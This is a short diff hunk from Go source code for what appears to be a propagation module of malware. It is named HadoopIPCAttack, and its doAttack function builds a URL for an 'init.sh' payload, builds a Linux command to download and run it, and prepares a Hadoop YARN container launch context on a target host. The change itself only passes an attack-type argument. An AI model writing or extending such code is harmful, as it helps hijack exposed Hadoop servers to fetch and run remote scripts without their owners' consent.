@@ -97,7 +97,7 @@ func (ha *HadoopIPCAttack) doAttack(ip string ,port int) error {
 	}
 
 	initUrl := ha.attackTasks.DownloadInitUrl(ip, port,HadoopIPCAttackType, "init.sh")
-	cmd := ha.attackTasks.InitCmdForLinux(initUrl)
+	cmd := ha.attackTasks.InitCmdForLinux(initUrl,HadoopIPCAttackType)
 
 	// Setup ContainerLaunchContext for the application
 	clc := hadoop_yarn.ContainerLaunchContextProto{}
